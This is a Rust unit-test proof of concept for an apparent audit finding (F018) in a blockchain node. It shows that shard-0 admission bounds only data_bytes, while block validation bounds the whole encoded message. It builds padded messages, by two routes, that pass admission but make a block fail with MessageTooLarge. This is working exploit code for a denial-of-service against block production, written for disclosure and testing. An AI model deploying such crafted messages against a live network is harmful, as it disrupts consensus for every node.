//! F018 PoC: the shard-0 admission path (`auth::open`) bounds only
//! `data_bytes`, never the encoded `Message`. A proposer with no per-message
//! size cap then packs such a message into a block that the real
//! `validate_body` rejects for size (`MessageTooLarge`). The two size checks
//! disagree, so one admitted message makes a proposal invalid on every node.
//!
//! This drives the REAL `crate::chain::shard0::auth::open` (admission) and the
//! REAL `crate::chain::block::validate_body` (validation) against the same
//! message. The proposer's own size gate is `PULL_BYTES` (~15 MiB, no
//! per-message 1 MiB cap); we show the message sits in the gap between the two
//! rules. Driving the full `Shard0Engine::propose` is not done here (it needs a
//! populated shard-0 state); that part of the chain is stated from source.
//!
//! The original finding's "2 x 550 KiB unknown-field padding" recipe does not
//! work (prost drops unknown fields on the decode of `data_bytes`). This PoC
//! uses the two routes the validator identified:
//!   (a) `data_bytes` padded with a well-formed unknown field to just under
//!       the 1 MiB `data_bytes` limit, so the ENCODED message (plus hash,
//!       signer and signature) exceeds 1 MiB; and
//!   (b) an `Ed25519Falcon512` signature whose `HyperSignatureExtension`
//!       carries a padded `falcon_signature` — `open` places no bound on
//!       `message.signature`.
//!
//! Wired as `#[cfg(test)] mod f018_poc_test;` in `src/chain/mod.rs`.

#[cfg(test)]
mod tests {
    use crate::chain::block::{seal, validate_body, BlockError, MAX_MESSAGE_BYTES, PULL_BYTES};
    use crate::chain::shard0::auth;
    use crate::proto::{
        self, FarcasterNetwork, HashScheme, HyperSignatureExtension, HypersnapBlock,
        HypersnapBlockHeader, Message, MessageData, MessageType, SignatureScheme,
    };
    use ed25519_dalek::{Signer, SigningKey};
    use prost::Message as _;

    // Far-future block time, so a message timestamp is never "too far ahead".
    const BLOCK_TS: u64 = 10_000_000_000;

    fn blake3_20(bytes: &[u8]) -> Vec<u8> {
        blake3::hash(bytes).as_bytes()[..20].to_vec()
    }

    fn base_data_bytes() -> Vec<u8> {
        MessageData {
            r#type: MessageType::TokenTransfer as i32, // hypersnap type => 1 MiB data_bytes limit
            fid: 123,
            timestamp: 1,
            network: FarcasterNetwork::Devnet as i32,
            body: None,
        }
        .encode_to_vec()
    }

    /// `data_bytes` padded to about `target` bytes with a well-formed unknown
    /// length-delimited field (field 50, wire type 2). prost ignores unknown
    /// fields, so `MessageData::decode` still yields the base message, and
    /// `auth::open` sees a normal `data` while the stored bytes are ~1 MiB.
    fn padded_data_bytes(target: usize) -> Vec<u8> {
        let base = base_data_bytes();
        let mut out = base.clone();
        out.push(0x92); // tag (50 << 3 | 2) = 402 -> varint 0x92 0x03
        out.push(0x03);
        let pad_len = target.saturating_sub(base.len() + 2 + 3); // 3 = varint bytes for ~1 MiB
        let mut n = pad_len as u64; // length prefix (varint)
        loop {
            let mut b = (n & 0x7f) as u8;
            n >>= 7;
            if n != 0 {
                b |= 0x80;
            }
            out.push(b);
            if n == 0 {
                break;
            }
        }
        out.extend(std::iter::repeat(0u8).take(pad_len));
        out
    }

    /// A dual-signed (`Ed25519Falcon512`) message: a genuine Ed25519 signature
    /// over the message hash (so `auth::open` accepts it) plus a
    /// `HyperSignatureExtension` whose `falcon_signature` is `falcon_pad` bytes.
    fn dual_signed(data_bytes: Vec<u8>, falcon_pad: usize) -> Message {
        let hash = blake3_20(&data_bytes);
        let sk = SigningKey::from_bytes(&[7u8; 32]);
        let sig = sk.sign(&hash); // 64 bytes, genuine
        let signer = sk.verifying_key().to_bytes().to_vec();
        let ext = HyperSignatureExtension {
            version: 1,
            falcon_signature: vec![0u8; falcon_pad],
            falcon_signer_key_hash: vec![0u8; 32],
            falcon_signer_key: vec![],
            falcon_custody_signature: vec![],
        };
        let mut signature = sig.to_bytes().to_vec();
        signature.extend(ext.encode_to_vec());
        Message {
            data: None,
            hash,
            hash_scheme: HashScheme::Blake3 as i32,
            signature,
            signature_scheme: SignatureScheme::Ed25519Falcon512 as i32,
            signer,
            data_bytes: Some(data_bytes),
        }
    }

    /// A valid shard-0 block carrying `messages`, with `hash` and
    /// `messages_root` filled by the real `seal`.
    fn sealed_block(messages: Vec<Message>) -> HypersnapBlock {
        let mut block = HypersnapBlock {
            header: Some(HypersnapBlockHeader {
                shard_id: 0,
                height: 1,
                timestamp: 1,
                version: 1,
                ..Default::default()
            }),
            messages,
            ..Default::default()
        };
        seal(&mut block);
        block
    }

    fn admitted(msg: &Message) -> bool {
        auth::open(msg, FarcasterNetwork::Devnet, BLOCK_TS).is_ok()
    }

    // ---- Route (a): data_bytes padded to just under the 1 MiB limit ----

    #[test]
    fn f018_route_a_data_bytes_padding() {
        let msg = dual_signed(padded_data_bytes(MAX_MESSAGE_BYTES - 16), 32);
        let data_bytes_len = msg.data_bytes.as_ref().unwrap().len();
        let encoded = msg.encoded_len();
        println!(
            "F018 route (a): data_bytes={} (<= {}), encoded message={} (> {}), PULL_BYTES={}",
            data_bytes_len, MAX_MESSAGE_BYTES, encoded, MAX_MESSAGE_BYTES, PULL_BYTES
        );

        // Admission accepts it: data_bytes is within the 1 MiB limit.
        assert!(data_bytes_len <= MAX_MESSAGE_BYTES);
        assert!(admitted(&msg), "auth::open rejected the padded message");

        // The proposer would include it: it fits the only size gate on propose.
        assert!(encoded <= PULL_BYTES);
        assert!(encoded > MAX_MESSAGE_BYTES);

        // The validator rejects the whole block for size.
        let block = sealed_block(vec![msg]);
        match validate_body(&block) {
            Err(BlockError::MessageTooLarge(n)) => {
                println!("F018 route (a): validate_body -> MessageTooLarge({})", n)
            }
            other => panic!("expected MessageTooLarge, got {:?}", other),
        }
    }

    // ---- Route (b): padded Ed25519Falcon512 signature extension ----

    #[test]
    fn f018_route_b_signature_extension_padding() {
        let msg = dual_signed(base_data_bytes(), 1_200_000);
        let data_bytes_len = msg.data_bytes.as_ref().unwrap().len();
        let encoded = msg.encoded_len();
        println!(
            "F018 route (b): data_bytes={} (<= {}), signature={} bytes, encoded message={} (> {})",
            data_bytes_len,
            MAX_MESSAGE_BYTES,
            msg.signature.len(),
            encoded,
            MAX_MESSAGE_BYTES
        );

        assert!(data_bytes_len <= MAX_MESSAGE_BYTES);
        assert!(admitted(&msg), "auth::open rejected the padded-signature message");
        assert!(encoded <= PULL_BYTES);
        assert!(encoded > MAX_MESSAGE_BYTES);

        let block = sealed_block(vec![msg]);
        match validate_body(&block) {
            Err(BlockError::MessageTooLarge(n)) => {
                println!("F018 route (b): validate_body -> MessageTooLarge({})", n)
            }
            other => panic!("expected MessageTooLarge, got {:?}", other),
        }
    }

    // ---- Control: a normal-sized message is admitted and validates ----

    #[test]
    fn f018_control_normal_message_validates() {
        let msg = dual_signed(base_data_bytes(), 32);
        let encoded = msg.encoded_len();
        println!(
            "F018 control: encoded message={} (<= {})",
            encoded, MAX_MESSAGE_BYTES
        );

        assert!(admitted(&msg), "auth::open rejected the normal message");
        assert!(encoded <= MAX_MESSAGE_BYTES);

        let block = sealed_block(vec![msg]);
        let result = validate_body(&block);
        println!("F018 control: validate_body -> {:?}", result);
        assert!(result.is_ok(), "normal-sized message block failed validation");
    }
}
